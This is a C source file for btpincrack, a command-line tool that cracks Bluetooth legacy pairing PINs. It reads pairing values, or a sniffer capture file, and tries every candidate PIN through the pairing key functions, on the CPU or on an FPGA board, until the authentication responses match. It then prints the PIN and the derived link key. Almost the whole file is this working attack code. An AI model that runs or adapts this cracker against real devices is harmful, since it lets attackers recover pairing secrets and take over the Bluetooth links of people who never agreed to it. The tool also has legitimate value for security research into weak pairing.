/*
 * Copyright (c) 2006 - David Hulton <dhulton@openciphers.org>
 * see LICENSE for details
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "btpincrack.h"
#include "../picod/libpicod.h"

extern u_char *l_key;
int verbose = 0;
int piconum = 0;

u_char
char2byte(char x) {
	x |= 0x20;
	return(((x) >= '0' && (x) <= '9') ? (x - '0') : 
	    ((x) >= 'a' && (x) <= 'f') ? (x - 'a') + 10 : 0xff);
}

void
flip(u_char *x, int len)
{
	int i, j, t;
	for(i = 0, j = len - 1; i < (len >> 1); i++, j--) {
		t = x[i];
		x[i] = x[j];
		x[j] = t;
	}
}

int
hex2byte(u_char *dst, char *src, int len)
{
	int i, j;
	u_char a, b;

	bzero(dst, len);

	for(i = j = 0; j < len; ) {
skipa:
		if((a = char2byte(src[i])) == 0xff) {
			if(src[i] == ')' || src[i] == '0') break;
			i++;
			goto skipa;
		}
		i++;
skipb:
		if((b = char2byte(src[i])) == 0xff) {
			if(src[i] == ')' || src[i] == '0') break;
			i++;
			goto skipb;
		}
		i++;

		dst[j++] = a << 4 | b;
	}

	return j;
}

int decimal = 0;
void
hexdump(u_char *buf, int len)
{
	int i;
	for(i = 0; i < len; i++) {
		if(decimal)
			printf("%d ", buf[i]);
		else
			printf("%02x ", buf[i]);
	}
	printf("\n");
}

/*
 * convert number like "1234" to 0x32, 0x54
 */
#define CONV2PIN(x) (((x) - '0') + 1)
void
num2pin(char *num, u_char *pin)
{
	int i, j;
	bzero(pin, 8);
	for(i = j = 0; i < 16 && num[i] != '\0'; i++) {
		if(i & 1)
			pin[j++] |= CONV2PIN(num[i]) << 4;
		else
			pin[j] = CONV2PIN(num[i]);

	}
}

/*
 * convert pin number like 0x32, 0x54 to "1234"
 */
#define CONV2NUM(x) ((x) > 0 ? (((x) - 1) + '0') : '\0')
void
pin2num(u_char *pin, char *num)
{
	int i, j;
	bzero(num, 16);
	for(i = j = 0; i < 8; i++) {
		num[j++] = CONV2NUM(pin[i] & 0xf);
		num[j++] = CONV2NUM((pin[i] >> 4) & 0xf);
	}
}

void
sub20(char *num)
{
	int i, carry;
	if(num[1] < '2') {
		num[1] += 8;
		carry = 1;
		for(i = 2; i < 16; i++) {
			if(carry) {
				if(num[i] == '0')
					num[i] = '9';
				else {
					num[i] -= 1;
					carry = 0;
				}
			}
		}
	} else
		num[1] -= 2;
}

void
fpgapincrack(u_char *m_bd_addr, u_char *s_bd_addr, u_char *in_rand,
         u_char *m_comb_key, u_char *s_comb_key, u_char *m_au_rand,
         u_char *s_au_rand, u_char *m_sres, u_char *s_sres, int fpga,
         char *start, char *stop)
{
	int mod = 0;
	u_char start_[8], stop_[8], res[8];
	char num[16];
	u_short t;

	flip(m_bd_addr, 6);
	flip(s_bd_addr, 6);

	piconum = fpga;
	picoinit(NULL);
	picoreboot(piconum, "E12LX-BTPinCrack.bit");

	if(start != NULL) {
		num2pin(start, start_);
		printf("start pin:  %s\n", start);
	} else
		memset(start_, 0, 8);

	if(stop != NULL) {
		num2pin(stop, stop_);
		printf("stop pin:   %s\n", stop);
	} else
		memset(stop_, 0xaa, 8);

	t = 1;
	picomemwrite(piconum, 0x12340080, &t, 2);
	picomemwrite(piconum, 0x12340000, start_, 8);
	picomemwrite(piconum, 0x12340008, stop_, 8);
	picomemwrite(piconum, 0x12340010, m_bd_addr, 6);
	picomemwrite(piconum, 0x12340018, s_bd_addr, 6);
	picomemwrite(piconum, 0x12340020, in_rand, 16);
	picomemwrite(piconum, 0x12340030, m_comb_key, 16);
	picomemwrite(piconum, 0x12340040, s_comb_key, 16);
	picomemwrite(piconum, 0x12340050, m_au_rand, 16);
	picomemwrite(piconum, 0x12340060, s_au_rand, 16);
	picomemwrite(piconum, 0x12340070, m_sres, 4);
	picomemwrite(piconum, 0x12340074, s_sres, 4);
	t = 0;
	picomemwrite(piconum, 0x12340080, &t, 2);
	while(1) {
		picomemread(piconum, 0x12340080, &t, 2);
		picomemread(piconum, 0x12340078, res, 8);
		pin2num(res, num);
		if(t >> 1) {
			if(t & 2)
				printf("\runable to find pin!\n");
			else {
				sub20(num);
				printf("\rpin:        %s\n", num);
			}
			break;
		}
		if((mod % 1337) == 0) {
			printf("\rtrying pin: %s", num);
			fflush(stdout);
		}
		usleep(20000);
	}
	exit(0);
}

void
pincrack(u_char *m_bd_addr, u_char *s_bd_addr, u_char *in_rand,
         u_char *m_comb_key, u_char *s_comb_key, u_char *m_au_rand,
         u_char *s_au_rand, u_char *m_sres, u_char *s_sres,
         u_char *pin, int pin_l, int pin_test)
{
	int i, carry, mod = 0;
	u_char Kinit[16];
	u_char m_lk_rand[16], s_lk_rand[16];
	u_char m_lk[16], s_lk[16], Kab[16];
	u_char m_sres_t[4], s_sres_t[4];
	flip(m_bd_addr, 6);
	flip(s_bd_addr, 6);

	while(1) {
		if((mod++ % 1337) == 0) {
			printf("\rtrying pin: %s", pin);
			fflush(stdout);
		}
		/* calculate hypothesis for Kinit */
		memcpy(Kinit, E22(pin, pin_l, s_bd_addr, in_rand), 16);

		/* decode lk_rand for master and slave */
		for(i = 0; i < 16; i++) {
			m_lk_rand[i] = m_comb_key[i] ^ Kinit[i];
			s_lk_rand[i] = s_comb_key[i] ^ Kinit[i];
		}

		/* calculate a hypothesis for Kab */
		memcpy(m_lk, E21(m_lk_rand, m_bd_addr), 16);
		memcpy(s_lk, E21(s_lk_rand, s_bd_addr), 16);

		for(i = 0; i < 16; i++)
			Kab[i] = m_lk[i] ^ s_lk[i];

		/* calculate sres out of au_rand */
		memcpy(m_sres_t, E1(Kab, s_au_rand, m_bd_addr), 4);
		memcpy(s_sres_t, E1(Kab, m_au_rand, s_bd_addr), 4);

		if(verbose) {
			printf("Kinit:      "); hexdump(Kinit, 16);
			printf("m_lk_rand:  "); hexdump(m_lk_rand, 16);
			printf("s_lk_rand:  "); hexdump(s_lk_rand, 16);
			printf("m_lk:       "); hexdump(m_lk, 16);
			printf("s_lk:       "); hexdump(s_lk, 16);
			printf("m_sres_t:   "); hexdump(m_sres_t, 4);
			printf("s_sres_t:   "); hexdump(s_sres_t, 4);
		}

		if(pin_test ||
		    (memcmp(m_sres_t, m_sres, 4) == 0 &&
		     memcmp(s_sres_t, s_sres, 4) == 0)) break;
		else {
			for(i = (pin_l - 1), carry = 1; i >= 0; i--) {
				if(carry) {
					carry = 0;
					if(pin[i] == '9') {
						pin[i] = '0';
						carry++;
						if(i == 0) {
							pin[pin_l++] = '0';
							break;
						}
					} else if(i == 0 && pin[i] == 0)
						pin[i] = '0';
					else
						pin[i]++;
				}
			}
		}
	}
	printf("\rKab:        "); hexdump(Kab, 16);
	printf("pin:        %s\n", pin);
}

#define IMPORT_BUF_LEN 1024
#define OPCODE_PREFIX  "Opcode("
#define MODE_IN_RAND   0x1
#define MODE_COMB_KEY  0x2
#define MODE_AU_RAND   0x3
#define MODE_SRES      0x4
#define MASTER_PREFIX  "C1("
#define MODE_MASTER    0x8
#define MODE_SLAVE     0x10
#define RAND_PREFIX    "random number("
#define SRES_PREFIX    "authentication response("
void importdata(u_char *fname, u_char *in_rand, u_char *m_comb_key,
    u_char *s_comb_key, u_char *m_au_rand, u_char *s_au_rand,
    u_char *m_sres, u_char *s_sres)
{
	int mode = 0;
	char buf[IMPORT_BUF_LEN], *p;
	FILE *fh;

	bzero(in_rand, 16);
	bzero(m_comb_key, 16);
	bzero(s_comb_key, 16);
	bzero(m_au_rand, 16);
	bzero(s_au_rand, 16);
	bzero(m_sres, 4);
	bzero(s_sres, 4);

	if((fh = fopen((char *)fname, "r")) == NULL)
		perror("unable to open file");
	while(fgets(buf, IMPORT_BUF_LEN, fh) != NULL) {
		if((p = strstr(buf, MASTER_PREFIX)) != NULL) {
			p += strlen(MASTER_PREFIX);
			if(*p == 'M')
				mode = MODE_MASTER;
			else if(*p == 'S')
				mode = MODE_SLAVE;
			else
				mode = 0;
		}
		if((p = strstr(buf, OPCODE_PREFIX)) != NULL) {
			p += strlen(OPCODE_PREFIX);
			if(strncmp(p, "in_rand", 7) == 0)
				mode |= MODE_IN_RAND;
			else if(strncmp(p, "comb_key", 8) == 0)
				mode |= MODE_COMB_KEY;
			else if(strncmp(p, "au_rand", 7) == 0)
				mode |= MODE_AU_RAND;
			else if(strncmp(p, "sres", 4) == 0)
				mode |= MODE_SRES;
		}
		if((p = strstr(buf, RAND_PREFIX)) != NULL) {
			p += strlen(RAND_PREFIX);
			switch(mode) {
			case MODE_MASTER | MODE_IN_RAND:
				hex2byte(in_rand, p, 16);
				break;
			case MODE_MASTER | MODE_COMB_KEY:
				hex2byte(m_comb_key, p, 16);
				break;
			case MODE_SLAVE  | MODE_COMB_KEY:
				hex2byte(s_comb_key, p, 16);
				break;
			case MODE_MASTER | MODE_AU_RAND:
				hex2byte(m_au_rand, p, 16);
				break;
			case MODE_SLAVE  | MODE_AU_RAND:
				hex2byte(s_au_rand, p, 16);
				break;
			}
		}
		if((p = strstr(buf, SRES_PREFIX)) != NULL) {
			p += strlen(SRES_PREFIX);
			switch(mode) {
			case MODE_MASTER | MODE_SRES:
				hex2byte(m_sres, p, 4);
				break;
			case MODE_SLAVE  | MODE_SRES:
				hex2byte(s_sres, p, 4);
				break;
			}
		}
	}
	fclose(fh);
}

void
usage(void)
{
	fprintf(stderr, "usage: btpincrack [-d (decimal)] [-v (verbose)] [-f (fpga[:start-stop])]\n"
			"                  [Ar]  <key> <blk>\n"
			"                  [Ar_] <key> <blk>\n"
			"                  [E22] <pin> <bd_addr> <in_rand>\n"
			"                  [E21] <lk_rand> <bd_addr>\n"
			"                  [E1]  <Kab> <au_rand> <bd_addr>\n"
			"                  [Go]  <m_bd_addr> <s_bd_addr> <in_rand>\n"
			"                        <m_comb_key> <s_comb_key>\n"
			"                        <m_au_rand> <s_au_rand>\n"
			"                        <m_sres> <s_sres> [pin]\n"
			"                  [Imp] <capture file> <m_bd_addr> <s_bd_addr> [pin]\n");
	exit(2);
}

extern int optind;

int
main(int argc, char *argv[])
{
	int c, usefpga = 0, fpga = 0;
	char *start = NULL, *stop = NULL;

	while((c = getopt(argc, argv, "dvh?f:")) != -1) {
		switch(c) {
		case 'd':
			decimal++;
			break;
		case 'v':
			verbose++;
			break;
		case 'f':
			usefpga = 1;
			if((start = strchr(optarg, ':')) != NULL) {
				*start = '\0';
				start++;
				if((stop = strchr(start, '-')) != NULL) {
					*stop = '\0';
					stop++;
				} else
					start = NULL;
			}
			fpga = strtoul(optarg, NULL, 0);
			break;
		case 'h':
		case '?':
			usage();
			break;
		}
	}
	argc -= optind;
	argv += optind;

	if(argc < 1) usage();

	if(strcmp(argv[0], "Ar") == 0 || strcmp(argv[0], "Ar_") == 0) {
		u_char blk[16], lk[17], *t;

		if(argc < 3) usage();

		hex2byte(lk, argv[1], 16);
		hex2byte(blk, argv[2], 16);
		printf("lk:  "); hexdump(lk, 16);
		printf("blk: "); hexdump(blk, 16);

		if(argv[0][2] == '_') {
			t = Ar_(lk, blk);
			printf("Ar_: "); hexdump(t, 16);
		} else {
			t = Ar(lk, blk);
			printf("Ar:  "); hexdump(t, 16);
		}
	} else if(strcmp(argv[0], "E22") == 0) {
		int pin_l;
		u_char pin[16], bd_addr[6], in_rand[16], *t;

		if(argc < 4) usage();

		pin_l = hex2byte(pin, argv[1], 16);
		hex2byte(bd_addr, argv[2], 6);
		hex2byte(in_rand, argv[3], 16);
		printf("pin:        "); hexdump(pin, pin_l);
		printf("bd_addr:    "); hexdump(bd_addr, 6);
		printf("in_rand:    "); hexdump(in_rand, 16);

		t = E22(pin, pin_l, bd_addr, in_rand);
		printf("Kinit:      "); hexdump(t, 16);
	} else if(strcmp(argv[0], "E21") == 0) {
		u_char lk_rand[16], bd_addr[6], *t;

		if(argc < 3) usage();

		hex2byte(lk_rand, argv[1], 16);
		hex2byte(bd_addr, argv[2], 6);
		printf("lk_rand:    "); hexdump(lk_rand, 16);
		printf("bd_addr:    "); hexdump(bd_addr, 6);

		t = E21(lk_rand, bd_addr);
		printf("Kab:        "); hexdump(t, 16);
	} else if(strcmp(argv[0], "E1") == 0) {
		u_char Kab[16], au_rand[16], bd_addr[6], *t;

		if(argc < 4) usage();

		hex2byte(Kab, argv[1], 16);
		hex2byte(au_rand, argv[2], 16);
		hex2byte(bd_addr, argv[3], 6);
		printf("Kab:        "); hexdump(Kab, 16);
		printf("au_rand:    "); hexdump(au_rand, 16);
		printf("bd_addr:    "); hexdump(bd_addr, 6);

		t = E1(Kab, au_rand, bd_addr);
		printf("srand:      "); hexdump(t, 4);
	} else if(strcmp(argv[0], "Go") == 0) {
		int pin_l;
		u_char m_bd_addr[6], s_bd_addr[6], in_rand[16];
		u_char m_comb_key[16], s_comb_key[16];
		u_char m_au_rand[16], s_au_rand[16];
		u_char m_sres[4], s_sres[4];
		u_char pin[16];

		if(argc < 10) usage();

		hex2byte(m_bd_addr, argv[1], 6);
		hex2byte(s_bd_addr, argv[2], 6);
		hex2byte(in_rand, argv[3], 16);
		hex2byte(m_comb_key, argv[4], 16);
		hex2byte(s_comb_key, argv[5], 16);
		hex2byte(m_au_rand, argv[6], 16);
		hex2byte(s_au_rand, argv[7], 16);
		hex2byte(m_sres, argv[8], 4);
		hex2byte(s_sres, argv[9], 4);
		bzero(pin, 16);
		if(argc > 10) {
			strncpy((char *)pin, argv[10], 16);
			pin_l = strlen((char *)pin);
		} else
			pin_l = 1;
		printf("m_bd_addr:  "); hexdump(m_bd_addr, 6);
		printf("s_bd_addr:  "); hexdump(s_bd_addr, 6);
		printf("in_rand:    "); hexdump(in_rand, 16);
		printf("m_comb_key: "); hexdump(m_comb_key, 16);
		printf("s_comb_key: "); hexdump(s_comb_key, 16);
		printf("m_au_rand:  "); hexdump(m_au_rand, 16);
		printf("s_au_rand:  "); hexdump(s_au_rand, 16);
		printf("m_sres:     "); hexdump(m_sres, 4);
		printf("s_sres:     "); hexdump(s_sres, 4);

		if(usefpga)
			fpgapincrack(m_bd_addr, s_bd_addr, in_rand, m_comb_key,
			    s_comb_key, m_au_rand, s_au_rand, m_sres, s_sres,
			    fpga, start, stop);
		else
			pincrack(m_bd_addr, s_bd_addr, in_rand, m_comb_key,
			    s_comb_key, m_au_rand, s_au_rand, m_sres, s_sres,
			    pin, pin_l, argc > 10);
	} else if(strcmp(argv[0], "Imp") == 0) {
		int pin_l;
		u_char m_bd_addr[6], s_bd_addr[6], in_rand[16];
		u_char m_comb_key[16], s_comb_key[16];
		u_char m_au_rand[16], s_au_rand[16];
		u_char m_sres[4], s_sres[4];
		u_char pin[16];

		if(argc < 4) usage();

		hex2byte(m_bd_addr, argv[2], 6);
		hex2byte(s_bd_addr, argv[3], 6);

		importdata((unsigned char *)argv[1], in_rand, m_comb_key,
		    s_comb_key, m_au_rand, s_au_rand, m_sres, s_sres);

		bzero(pin, 16);
		if(argc > 4) {
			strncpy((char *)pin, argv[4], 16);
			pin_l = strlen((char *)pin);
		} else
			pin_l = 1;

		printf("m_bd_addr:  "); hexdump(m_bd_addr, 6);
		printf("s_bd_addr:  "); hexdump(s_bd_addr, 6);
		printf("in_rand:    "); hexdump(in_rand, 16);
		printf("m_comb_key: "); hexdump(m_comb_key, 16);
		printf("s_comb_key: "); hexdump(s_comb_key, 16);
		printf("m_au_rand:  "); hexdump(m_au_rand, 16);
		printf("s_au_rand:  "); hexdump(s_au_rand, 16);
		printf("m_sres:     "); hexdump(m_sres, 4);
		printf("s_sres:     "); hexdump(s_sres, 4);

		if(usefpga)
			fpgapincrack(m_bd_addr, s_bd_addr, in_rand, m_comb_key,
			    s_comb_key, m_au_rand, s_au_rand, m_sres, s_sres,
			    fpga, start, stop);
		else
			pincrack(m_bd_addr, s_bd_addr, in_rand, m_comb_key,
			    s_comb_key, m_au_rand, s_au_rand, m_sres, s_sres,
			    pin, pin_l, argc > 4);
	}
	return 0;
}
